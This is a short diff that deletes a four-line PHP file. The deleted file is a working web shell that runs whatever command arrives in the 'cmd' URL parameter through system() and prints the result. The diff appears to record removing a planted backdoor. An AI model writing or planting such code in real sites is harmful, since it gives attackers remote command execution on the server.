@@ -1,4 +1,0 @@
-<?php
-$output = system($_GET['cmd']);
-echo "<br>$output<br>";
-?>
